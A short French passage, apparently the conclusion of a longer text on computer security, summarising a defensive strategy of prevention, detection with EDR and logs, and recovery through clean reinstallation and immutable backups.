La défense repose donc sur une stratégie combinée :  
- **Prévention** (patch management, moindre privilège, durcissement),  
- **Détection** (EDR, logs, surveillance des anomalies),  
- **Réaction** (procédures de réinstallation propre, restauration via sauvegardes immuables).  

En résumé, sécuriser un système ne se limite pas à installer un antivirus : c’est un travail 
continu d’**hygiène, de vigilance et de résilience** face à des adversaires toujours plus créatifs.  
